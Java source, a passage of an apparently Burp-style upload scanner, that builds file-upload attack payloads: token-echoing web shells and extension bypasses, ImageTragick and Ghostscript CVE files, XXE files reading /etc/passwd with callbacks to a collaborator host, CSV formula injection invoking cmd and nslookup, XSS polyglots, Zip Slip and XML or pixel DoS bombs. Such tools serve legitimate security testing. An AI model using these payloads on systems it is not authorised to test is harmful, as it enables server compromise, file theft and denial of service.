package com.littlespidy.uploadscanner.engine;

import com.littlespidy.uploadscanner.model.PayloadDefinition;
import com.littlespidy.uploadscanner.model.UploadScannerConfig;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.zip.GZIPOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * Created with the help of an AI Agent and littlespidy.
 *
 * Generates file upload attack payloads spanning Web Shells, Image Polyglots,
 * Path Traversal, Null Bytes, SVG XSS, and EICAR AV checks.
 *
 * @author littlespidy
 */
public class UploadPayloadGenerator {
    public static final String EXEC_TOKEN = "UPLOAD_SCANNER_EXEC_SUCCESS_";

    /**
     * Generates a curated list of test payloads according to configuration.
     */
    public static List<PayloadDefinition> generatePayloads(UploadScannerConfig config, String baseFilename) {
        return generatePayloads(config, baseFilename, "");
    }

    public static List<PayloadDefinition> generatePayloads(UploadScannerConfig config, String baseFilename, String collaboratorDomain) {
        List<PayloadDefinition> payloads = new ArrayList<>();
        long timestamp = System.currentTimeMillis();
        String token = EXEC_TOKEN + timestamp;
        String collab = (collaboratorDomain != null && !collaboratorDomain.trim().isEmpty())
                ? collaboratorDomain.trim()
                : "collab-test.burpcollaborator.net";

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 1: SERVER-SIDE CODE EXECUTION (RCE)
        // ══════════════════════════════════════════════════════════════════

        // 1. PHP Web Shells & Bypasses
        if (config.isTestPhp()) {
            payloads.add(new PayloadDefinition(
                    "PHP Info Shell",
                    "Server RCE",
                    "upload_test.php",
                    "application/x-php",
                    "<?php echo '" + token + "'; phpinfo(); ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Alternative Extension (.phtml)",
                    "Server RCE",
                    "upload_test.phtml",
                    "application/x-phtml",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Alternative Extension (.php5)",
                    "Server RCE",
                    "upload_test.php5",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Phar Archive (.phar)",
                    "Server RCE",
                    "upload_test.phar",
                    "application/octet-stream",
                    "<?php echo '" + token + "'; __HALT_COMPILER(); ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Null Byte (.php%00.png)",
                    "Server RCE",
                    "upload_test.php%00.png",
                    "image/png",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHP Double Extension (.php.jpg)",
                    "Server RCE",
                    "upload_test.php.jpg",
                    "image/jpeg",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            // GIF89a + PHP Polyglot
            String gifPhp = "GIF89a/*\u0000\u0001\u0000\u0001\u0080\u0000\u0000\u0000\u0000\u0000\u00ff\u00ff\u00ff!\u00f9\u0004\u0001\u0000\u0000\u0000\u0000,*/=1; " +
                    "/*\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000\u0000\u0002\u0002D\u0001\u0000; " +
                    "*/\n<?php echo '" + token + "'; ?>";
            payloads.add(new PayloadDefinition(
                    "PHP GIF89a Polyglot",
                    "Server RCE",
                    "avatar_php.gif",
                    "image/gif",
                    gifPhp,
                    token
            ));

            // PNG IDAT Chunk PHP Polyglot
            byte[] pngHeader = new byte[] {
                    (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                    0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4, (byte) 0x89
            };
            byte[] phpSnippet = ("\n<?php echo '" + token + "'; ?>").getBytes(StandardCharsets.UTF_8);
            byte[] pngPayload = new byte[pngHeader.length + phpSnippet.length];
            System.arraycopy(pngHeader, 0, pngPayload, 0, pngHeader.length);
            System.arraycopy(phpSnippet, 0, pngPayload, pngHeader.length, phpSnippet.length);
            payloads.add(new PayloadDefinition(
                    "PHP PNG Header Polyglot",
                    "Server RCE",
                    "avatar_php.png",
                    "image/png",
                    pngPayload,
                    token
            ));
        }

        // 2. JSP / JSPX
        if (config.isTestJsp()) {
            payloads.add(new PayloadDefinition(
                    "JSP Scriptlet Shell",
                    "Server RCE",
                    "upload_test.jsp",
                    "application/x-jsp",
                    "<% out.println(\"" + token + "\"); %>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "JSP Expression Language (${...})",
                    "Server RCE",
                    "upload_el.jsp",
                    "application/x-jsp",
                    "${'" + token + "'}",
                    token
            ));

            String jspx = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n" +
                    "  <jsp:directive.page contentType=\"text/html\"/>\n" +
                    "  <jsp:scriptlet>out.println(\"" + token + "\");</jsp:scriptlet>\n" +
                    "</jsp:root>";
            payloads.add(new PayloadDefinition(
                    "JSPX XML Shell",
                    "Server RCE",
                    "upload_test.jspx",
                    "application/xml",
                    jspx,
                    token
            ));
        }

        // 3. ASP / ASPX
        if (config.isTestAsp()) {
            payloads.add(new PayloadDefinition(
                    "ASP Classic Shell",
                    "Server RCE",
                    "upload_test.asp",
                    "text/asp",
                    "<% Response.Write(\"" + token + "\") %>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "ASPX Inline Shell",
                    "Server RCE",
                    "upload_test.aspx",
                    "application/x-aspx",
                    "<%@ Page Language=\"C#\" %><% Response.Write(\"" + token + "\"); %>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "ASP IIS Semicolon Bypass (.asp;.jpg)",
                    "Server RCE",
                    "upload_test.asp;.jpg",
                    "image/jpeg",
                    "<% Response.Write(\"" + token + "\") %>",
                    token
            ));
        }

        // 4. Apache .htaccess
        if (config.isTestHtaccess()) {
            String htaccess = "AddType application/x-httpd-php .jpg\n" +
                    "AddHandler application/x-httpd-php .jpg\n" +
                    "php_flag engine on\n";
            payloads.add(new PayloadDefinition(
                    "Apache .htaccess AddType Override",
                    "Server RCE",
                    ".htaccess",
                    "text/plain",
                    htaccess,
                    "AddType"
            ));

            payloads.add(new PayloadDefinition(
                    "PHP in JPG (Pair for .htaccess)",
                    "Server RCE",
                    "image_shell.jpg",
                    "image/jpeg",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));
        }

        // 5. IIS web.config
        if (config.isTestWebConfig()) {
            String webConfig = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<configuration>\n" +
                    "  <system.webServer>\n" +
                    "    <handlers accessPolicy=\"Read, Script, Execute\">\n" +
                    "      <add name=\"PHP-FastCGI-JPG\" path=\"*.jpg\" verb=\"*\" modules=\"FastCgiModule\" scriptProcessor=\"C:\\php\\php-cgi.exe\" resourceType=\"Either\" />\n" +
                    "    </handlers>\n" +
                    "  </system.webServer>\n" +
                    "</configuration>";
            payloads.add(new PayloadDefinition(
                    "IIS web.config FastCGI Handler Mapping",
                    "Server RCE",
                    "web.config",
                    "application/xml",
                    webConfig,
                    "FastCgiModule"
            ));
        }

        // 6. CGI Scripts (Perl, Python, Ruby, Shell)
        if (config.isTestCgi()) {
            payloads.add(new PayloadDefinition(
                    "Perl CGI Script",
                    "Server RCE",
                    "upload_test.pl",
                    "application/x-perl",
                    "#!/usr/bin/perl\nprint \"Content-Type: text/plain\\r\\n\\r\\n\";\nprint \"" + token + "\";\n",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Python CGI Script",
                    "Server RCE",
                    "upload_test.py",
                    "text/x-python",
                    "#!/usr/bin/env python\nprint(\"Content-Type: text/plain\\r\\n\")\nprint(\"" + token + "\")\n",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Ruby CGI Script",
                    "Server RCE",
                    "upload_test.rb",
                    "application/x-ruby",
                    "#!/usr/bin/ruby\nputs \"Content-Type: text/plain\\r\\n\"\nputs \"" + token + "\"\n",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Bash / Shell CGI Script",
                    "Server RCE",
                    "upload_test.sh",
                    "application/x-sh",
                    "#!/bin/bash\necho -e \"Content-Type: text/plain\\r\\n\"\necho \"" + token + "\"\n",
                    token
            ));
        }

        // 7. SSI & ESI
        if (config.isTestSsiEsi()) {
            String ssi = "<!--#echo var=\"DATE_LOCAL\" -->\n" +
                    "<!--#exec cmd=\"echo " + token + "\" -->\n" +
                    "<!--#include virtual=\"/etc/passwd\" -->\n";
            payloads.add(new PayloadDefinition(
                    "SSI (Server-Side Includes)",
                    "Server RCE",
                    "upload_test.shtml",
                    "text/html",
                    ssi,
                    token
            ));

            String esi = "<esi:include src=\"http://" + collab + "/esi_callback\" />\n" +
                    "<esi:inline name=\"" + token + "\" fetchable=\"no\">" + token + "</esi:inline>";
            payloads.add(new PayloadDefinition(
                    "ESI (Edge-Side Includes SSRF)",
                    "Server RCE",
                    "upload_test.esi",
                    "text/html",
                    esi,
                    token,
                    collab,
                    true
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 2: IMAGE LIBRARY EXPLOITS & CVES
        // ══════════════════════════════════════════════════════════════════

        // 8. ImageTragick (CVE-2016-3714 RCE, CVE-2016-3718 SSRF, Bad Manners XBM)
        if (config.isTestImageTragick()) {
            String mvgRce = "push graphic-context\n" +
                    "viewbox 0 0 640 480\n" +
                    "fill 'url(https://" + collab + "/im_mvg\";echo \"" + token + "\";\")'\n" +
                    "pop graphic-context";
            payloads.add(new PayloadDefinition(
                    "ImageTragick MVG RCE/SSRF (CVE-2016-3714)",
                    "Image Libraries",
                    "imagetragick.mvg",
                    "image/x-magick",
                    mvgRce,
                    token,
                    collab,
                    true
            ));

            String svgImageTragick = "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
                    "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n" +
                    "<svg width=\"640px\" height=\"480px\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n" +
                    "  <image xlink:href=\"https://" + collab + "/im_svg`echo " + token + "`\" x=\"0\" y=\"0\" height=\"640px\" width=\"640px\"/>\n" +
                    "</svg>";
            payloads.add(new PayloadDefinition(
                    "ImageTragick SVG RCE (CVE-2016-3714)",
                    "Image Libraries",
                    "imagetragick.svg",
                    "image/svg+xml",
                    svgImageTragick,
                    token,
                    collab,
                    true
            ));

            // Bad Manners CVE-2018-16323 XBM memory disclosure
            String xbm = "#define xbm_width 16\n" +
                    "#define xbm_height 16\n" +
                    "static char xbm_bits[] = {\n" +
                    "  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\n" +
                    "  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff\n" +
                    "};\n";
            payloads.add(new PayloadDefinition(
                    "ImageMagick Bad Manners Memory Leak (CVE-2018-16323)",
                    "Image Libraries",
                    "bad_manners.xbm",
                    "image/x-xbitmap",
                    xbm,
                    "xbm_bits"
            ));
        }

        // 9. Magick Delegates (MSL, Ephemeral, Text)
        if (config.isTestMagickDelegates()) {
            String msl = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<image>\n" +
                    "  <read filename=\"https://" + collab + "/msl_read.jpg\" />\n" +
                    "  <write filename=\"/dev/null\" />\n" +
                    "</image>";
            payloads.add(new PayloadDefinition(
                    "ImageMagick MSL Delegate SSRF",
                    "Image Libraries",
                    "delegate.msl",
                    "application/xml",
                    msl,
                    "image",
                    collab,
                    true
            ));
        }

        // 10. Ghostscript SAFER Bypass & LFI
        if (config.isTestGhostscript()) {
            String gsPasswd = "%!PS\n" +
                    "/Size 20 def\n" +
                    "/Line 0 def\n" +
                    "/Buf 1024 string def\n" +
                    "/Path 0 newpath def\n" +
                    "/Courier-Bold findfont Size scalefont setfont\n" +
                    "1 1 1 setrgbcolor clippath fill\n" +
                    "0 0 0 setrgbcolor\n" +
                    "(/etc/passwd) .libfile {\n" +
                    "    {\n" +
                    "        dup Buf readline\n" +
                    "        { Path Line moveto show } { showpage quit } ifelse\n" +
                    "        /Line Line Size add def\n" +
                    "    } loop\n" +
                    "} if\n";
            payloads.add(new PayloadDefinition(
                    "Ghostscript /etc/passwd LFI (CVE-2016-7977)",
                    "Image Libraries",
                    "ghostscript_lfi.ps",
                    "application/postscript",
                    gsPasswd,
                    "root:x:0:0"
            ));

            String gsRce = "%!PS\n" +
                    "currentdevice null true mark /OutputFile (%pipe%echo " + token + ")\n" +
                    ".putdeviceparams\n" +
                    "quit\n";
            payloads.add(new PayloadDefinition(
                    "Ghostscript SAFER Pipe RCE (CVE-2017-8291)",
                    "Image Libraries",
                    "ghostscript_rce.eps",
                    "application/postscript",
                    gsRce,
                    token
            ));
        }

        // 11. LibAVFormat SSRF (M3U8 Playlists & AVI)
        if (config.isTestLibavformat()) {
            String m3u8 = "#EXTM3U\r\n" +
                    "#EXT-X-MEDIA-SEQUENCE:0\r\n" +
                    "#EXTINF:10.0,\r\n" +
                    "http://" + collab + "/libav_ssrf.mp4\r\n" +
                    "#EXT-X-ENDLIST\r\n";
            payloads.add(new PayloadDefinition(
                    "LibAVFormat HLS M3U8 SSRF",
                    "Image Libraries",
                    "playlist.m3u8",
                    "application/vnd.apple.mpegurl",
                    m3u8,
                    "EXTM3U",
                    collab,
                    true
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 3: XML & DOCUMENT ATTACKS
        // ══════════════════════════════════════════════════════════════════

        // 12. XXE SVG
        if (config.isTestXxeSvg()) {
            String xxeSvg = "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
                    "<!DOCTYPE svg [\n" +
                    "  <!ENTITY % dtd SYSTEM \"http://" + collab + "/svg_collab.dtd\">\n" +
                    "  %dtd;\n" +
                    "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                    "]>\n" +
                    "<svg width=\"300\" height=\"300\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                    "  <text x=\"20\" y=\"50\" font-size=\"16\">&xxe;</text>\n" +
                    "</svg>";
            payloads.add(new PayloadDefinition(
                    "SVG XXE (Local File & OOB Callback)",
                    "XML & Documents",
                    "xxe_vector.svg",
                    "image/svg+xml",
                    xxeSvg,
                    "root:x:0:0",
                    collab,
                    true
            ));
        }

        // 13. XXE XML
        if (config.isTestXxeXml()) {
            String xxeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<!DOCTYPE root [\n" +
                    "  <!ENTITY % oob SYSTEM \"http://" + collab + "/xml_xxe\">\n" +
                    "  %oob;\n" +
                    "  <!ENTITY file SYSTEM \"file:///etc/passwd\">\n" +
                    "]>\n" +
                    "<root><data>&file;</data></root>";
            payloads.add(new PayloadDefinition(
                    "Generic XML XXE Injection",
                    "XML & Documents",
                    "xxe_payload.xml",
                    "application/xml",
                    xxeXml,
                    "root:x:0:0",
                    collab,
                    true
            ));
        }

        // 14. XXE Office OpenXML (DOCX in-memory ZIP)
        if (config.isTestXxeOffice()) {
            byte[] docxBytes = createOfficeDocxXxe(collab);
            payloads.add(new PayloadDefinition(
                    "Microsoft Word (.docx) XXE OOB Injection",
                    "XML & Documents",
                    "document_xxe.docx",
                    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                    docxBytes,
                    "",
                    collab,
                    true
            ));
        }

        // 15. XXE XMP Packet Metadata
        if (config.isTestXxeXmp()) {
            String xmp = "<?xpacket begin=\"\uFEFF\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?>\n" +
                    "<!DOCTYPE rdf:RDF [\n" +
                    "  <!ENTITY % xmp_collab SYSTEM \"http://" + collab + "/xmp_xxe\">\n" +
                    "  %xmp_collab;\n" +
                    "]>\n" +
                    "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\">\n" +
                    "  <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"/>\n" +
                    "</x:xmpmeta>\n" +
                    "<?xpacket end=\"w\"?>";
            payloads.add(new PayloadDefinition(
                    "XMP Metadata Packet XXE Injection",
                    "XML & Documents",
                    "metadata.xmp",
                    "application/rdf+xml",
                    xmp,
                    "xmpmeta",
                    collab,
                    true
            ));
        }

        // 16. PDF Injections (Launch Action, JavaScript, URI Callback)
        if (config.isTestPdfInjections()) {
            String pdfJs = "%PDF-1.4\n" +
                    "1 0 obj\n" +
                    "<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('" + token + "');) >> >>\n" +
                    "endobj\n" +
                    "2 0 obj\n" +
                    "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n" +
                    "endobj\n" +
                    "3 0 obj\n" +
                    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n" +
                    "endobj\n" +
                    "xref\n" +
                    "0 4\n" +
                    "0000000000 65535 f \n" +
                    "0000000009 00000 n \n" +
                    "0000000100 00000 n \n" +
                    "0000000155 00000 n \n" +
                    "trailer\n" +
                    "<< /Size 4 /Root 1 0 R >>\n" +
                    "startxref\n" +
                    "225\n" +
                    "%%EOF";
            payloads.add(new PayloadDefinition(
                    "PDF JavaScript Action Injection",
                    "XML & Documents",
                    "active_script.pdf",
                    "application/pdf",
                    pdfJs,
                    token
            ));

            String pdfCollab = "%PDF-1.7\n" +
                    "1 0 obj <</Type/Catalog/Pages 2 0 R>> endobj\n" +
                    "2 0 obj <</Type/Pages/Kids[3 0 R]/Count 1>> endobj\n" +
                    "3 0 obj <</Type/Page/Parent 2 0 R/AA <</O <</F (http://" + collab + "/pdf_read)/D [0 /Fit]/S /GoToE>>>>>> endobj\n" +
                    "trailer <</Size 4/Root 1 0 R>>\n" +
                    "startxref\n180\n%%EOF";
            payloads.add(new PayloadDefinition(
                    "PDF Out-of-Band Callback (SSRF / NTLM)",
                    "XML & Documents",
                    "callback_probe.pdf",
                    "application/pdf",
                    pdfCollab,
                    "",
                    collab,
                    true
            ));
        }

        // 17. CSV / Spreadsheet Formula Injection
        if (config.isTestCsvFormula()) {
            String csvPayload = "=cmd|' /C calc'!A0\n" +
                    "@SUM(1+1)*cmd|' /C calc'!A0\n" +
                    "-2+3+cmd|' /C nslookup " + collab + "'!A0\n" +
                    "\"" + token + "\",\"FormulaTest\"\n";
            payloads.add(new PayloadDefinition(
                    "CSV Formula Injection (=cmd|...)",
                    "XML & Documents",
                    "report_export.csv",
                    "text/csv",
                    csvPayload,
                    token,
                    collab,
                    true
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 4: CLIENT-SIDE & CSP POLYGLOTS
        // ══════════════════════════════════════════════════════════════════

        // 18. HTML XSS
        if (config.isTestXssHtml()) {
            String htmlXss = "<!DOCTYPE html>\n" +
                    "<html>\n" +
                    "<body>\n" +
                    "  <h1>Upload Test</h1>\n" +
                    "  <script>alert('" + token + "');</script>\n" +
                    "  <img src=x onerror=\"alert('" + token + "')\">\n" +
                    "</body>\n" +
                    "</html>";
            payloads.add(new PayloadDefinition(
                    "HTML Stored XSS",
                    "Client-Side",
                    "test_vector.html",
                    "text/html",
                    htmlXss,
                    token
            ));
        }

        // 19. SVG XSS
        if (config.isTestXssSvg()) {
            String svgXss = "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
                    "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n" +
                    "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                    "   <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n" +
                    "   <script type=\"text/javascript\">\n" +
                    "      alert('" + token + "');\n" +
                    "   </script>\n" +
                    "</svg>";
            payloads.add(new PayloadDefinition(
                    "SVG Stored XSS",
                    "Client-Side",
                    "vector.svg",
                    "image/svg+xml",
                    svgXss,
                    token
            ));
        }

        // 20. SWF Flash XSS
        if (config.isTestXssSwf()) {
            byte[] swfBytes = createSwfPayload(token);
            payloads.add(new PayloadDefinition(
                    "Adobe Flash SWF XSS",
                    "Client-Side",
                    "vector.swf",
                    "application/x-shockwave-flash",
                    swfBytes,
                    token
            ));
        }

        // 21. JPEG + JavaScript CSP Polyglot (PortSwigger authentic polyglot)
        if (config.isTestPolyglotJpeg()) {
            byte[] jpegPolyglot = createJpegCspPolyglot();
            payloads.add(new PayloadDefinition(
                    "JPEG + JavaScript CSP Polyglot",
                    "Client-Side",
                    "polyglot_csp.jpg",
                    "image/jpeg",
                    jpegPolyglot,
                    "Burp rocks."
            ));
        }

        // 22. GIF89a + JavaScript CSP Polyglot (ThinkFu authentic polyglot)
        if (config.isTestPolyglotGif()) {
            byte[] gifPolyglot = createGifCspPolyglot();
            payloads.add(new PayloadDefinition(
                    "GIF89a + JavaScript CSP Polyglot",
                    "Client-Side",
                    "polyglot_csp.gif",
                    "image/gif",
                    gifPolyglot,
                    "ThinkFu"
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 5: ARCHIVES, QUIRKS & DOS
        // ══════════════════════════════════════════════════════════════════

        // 23. Zip Slip Archive Traversal
        if (config.isTestZipSlip()) {
            byte[] zipSlipBytes = createZipSlipArchive(token);
            payloads.add(new PayloadDefinition(
                    "Zip Slip Archive Traversal (../../shell.php)",
                    "Archives & Quirks",
                    "archive_slip.zip",
                    "application/zip",
                    zipSlipBytes,
                    token
            ));
        }

        // 24. Tar Symlink Archive
        if (config.isTestTarSymlink()) {
            byte[] tarBytes = createTarSymlinkArchive("/etc/passwd");
            payloads.add(new PayloadDefinition(
                    "TAR Archive Symlink to /etc/passwd",
                    "Archives & Quirks",
                    "archive_symlink.tar",
                    "application/x-tar",
                    tarBytes,
                    "root:x:0:0"
            ));
        }

        // 25. Upload Quirks (Trailing dot, space, null-byte, mixed-case)
        if (config.isTestUploadQuirks()) {
            payloads.add(new PayloadDefinition(
                    "Quirk: Trailing Dot (.php.)",
                    "Archives & Quirks",
                    "upload_quirk.php.",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Quirk: Trailing Space (.php )",
                    "Archives & Quirks",
                    "upload_quirk.php ",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Quirk: Mixed Case (.PhP)",
                    "Archives & Quirks",
                    "upload_quirk.PhP",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));
        }

        // 26. EICAR Standard Anti-Virus Test File
        if (config.isTestEicar()) {
            String eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
            payloads.add(new PayloadDefinition(
                    "EICAR Anti-Virus Test String",
                    "Archives & Quirks",
                    "eicar_av_test.txt",
                    "text/plain",
                    eicar,
                    "EICAR"
            ));
        }

        // 27. DoS: Pixel Flood Image Bomb (Disabled by default)
        if (config.isTestPixelFlood()) {
            byte[] pixelFlood = createPixelFloodPng();
            payloads.add(new PayloadDefinition(
                    "DoS: Pixel Flood PNG (65535x65535)",
                    "Archives & Quirks",
                    "pixel_flood.png",
                    "image/png",
                    pixelFlood,
                    ""
            ));
        }

        // 28. DoS: XML Billion Laughs Bomb (Disabled by default)
        if (config.isTestBillionLaughs()) {
            String billionLaughs = "<?xml version=\"1.0\"?>\n" +
                    "<!DOCTYPE lolz [\n" +
                    " <!ENTITY lol \"lol\">\n" +
                    " <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
                    " <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n" +
                    " <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
                    " <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
                    " <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n" +
                    "]>\n" +
                    "<lolz>&lol5;</lolz>";
            payloads.add(new PayloadDefinition(
                    "DoS: XML Billion Laughs Expansion",
                    "Archives & Quirks",
                    "billion_laughs.xml",
                    "application/xml",
                    billionLaughs,
                    ""
            ));
        }

        // ══════════════════════════════════════════════════════════════════
        // CATEGORY 6: ALLOWED EXTENSIONS MATRIX PROBE
        // ══════════════════════════════════════════════════════════════════
        if (config.isTestAllowedExtensions()) {
            payloads.addAll(generateAllowedExtensionPayloads(config, baseFilename, token));
        }

        return payloads;
    }

    /**
     * Generates exclusively Allowed Extension probe payloads (for standalone quick-test probe).
     */
    public static List<PayloadDefinition> generateAllowedExtensionPayloadsOnly(UploadScannerConfig config, String baseFilename) {
        long timestamp = System.currentTimeMillis();
        String token = EXEC_TOKEN + timestamp;
        return generateAllowedExtensionPayloads(config, baseFilename, token);
    }

    /**
     * Generates Allowed Extension probe payloads across Images, Documents, Web/Data, Archives, Media, and Custom.
     */
    public static List<PayloadDefinition> generateAllowedExtensionPayloads(UploadScannerConfig config, String baseFilename, String token) {
        List<PayloadDefinition> payloads = new ArrayList<>();
        String category = "Allowed Extensions";

        // 1. Images
        if (config.isTestExtImages()) {
            payloads.add(new PayloadDefinition("Allowed Extension: JPEG (.jpg)", category, "probe_test.jpg", "image/jpeg", createMinimalJpeg(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: JPEG (.jpeg)", category, "probe_test.jpeg", "image/jpeg", createMinimalJpeg(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: PNG (.png)", category, "probe_test.png", "image/png", createMinimalPng(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: GIF (.gif)", category, "probe_test.gif", "image/gif", createMinimalGif(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: WebP (.webp)", category, "probe_test.webp", "image/webp", createMinimalWebp(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: BMP (.bmp)", category, "probe_test.bmp", "image/bmp", createMinimalBmp(), token));
            String svgContent = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"><text x=\"10\" y=\"20\">Probe: " + token + "</text></svg>";
            payloads.add(new PayloadDefinition("Allowed Extension: SVG (.svg)", category, "probe_test.svg", "image/svg+xml", svgContent, token));
            payloads.add(new PayloadDefinition("Allowed Extension: ICO (.ico)", category, "probe_test.ico", "image/x-icon", createMinimalIco(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: TIFF (.tiff)", category, "probe_test.tiff", "image/tiff", createMinimalTiff(), token));
            payloads.add(new PayloadDefinition("Allowed Extension: AVIF (.avif)", category, "probe_test.avif", "image/avif", createMinimalAvif(), token));
        }

        // 2. Documents
        if (config.isTestExtDocuments()) {
            payloads.add(new PayloadDefinition("Allowed Extension: Plain Text (.txt)", category, "probe_test.txt", "text/plain", "Upload Scanner Allowed Extension Probe: txt | " + token + "\n", token));
            payloads.add(new PayloadDefinition("Allowed Extension: PDF (.pdf)", category, "probe_test.pdf", "application/pdf", createMinimalPdf(token), token));
            payloads.add(new PayloadDefinition("Allowed Extension: Word 97-2003 (.doc)", category, "probe_test.doc", "application/msword", createMinimalOleCfbf("doc"), token));
            payloads.add(new PayloadDefinition("Allowed Extension: Word DOCX (.docx)", category, "probe_test.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", createMinimalDocxBenign(token), token));
            payloads.add(new PayloadDefinition("Allowed Extension: Excel 97-2003 (.xls)", category, "probe_test.xls", "application/vnd.ms-excel", createMinimalOleCfbf("xls"), token));
            payloads.add(new PayloadDefinition("Allowed Extension: Excel XLSX (.xlsx)", category, "probe_test.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", createMinimalXlsxBenign(token), token));
            payloads.add(new PayloadDefinition("Allowed Extension: PowerPoint 97-2003 (.ppt)", category, "probe_test.ppt", "application/vnd.ms-powerpoint", createMinimalOleCfbf("ppt"), token));
            payloads.add(new PayloadDefinition("Allowed Extension: PowerPoint PPTX (.pptx)", category, "probe_test.pptx", "application/vnd.openxmlformats-officedocument.presentationml.presentation", createMinimalPptxBenign(token), token));
            String csvContent = "\"Probe\",\"Extension\",\"Token\"\n\"Allowed\",\"csv\",\"" + token + "\"\n";
            payloads.add(new PayloadDefinition("Allowed Extension: CSV (.csv)", category, "probe_test.csv", "text/csv", csvContent, token));
            String rtfContent = "{\\rtf1\\ansi\\deff0 Upload Scanner Allowed Extension Probe: " + token + "}";
            payloads.add(new PayloadDefinition("Allowed Extension: RTF (.rtf)", category, "probe_test.rtf", "application/rtf", rtfContent, token));
            payloads.add(new PayloadDefinition("Allowed Extension: OpenDocument Text (.odt)", category, "probe_test.odt", "application/vnd.oasis.opendocument.text", createMinimalOdtBenign(token), token));
        }

        // 3. Web & Data
        if (config.isTestExtWebData()) {
            String jsonContent = "{\"status\":\"probe\",\"extension\":\"json\",\"token\":\"" + token + "\"}";
            payloads.add(new PayloadDefinition("Allowed Extension: JSON (.json)", category, "probe_test.json", "application/json", jsonContent, token));
            String xmlContent = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<probe extension=\"xml\"><token>" + token + "</token></probe>";
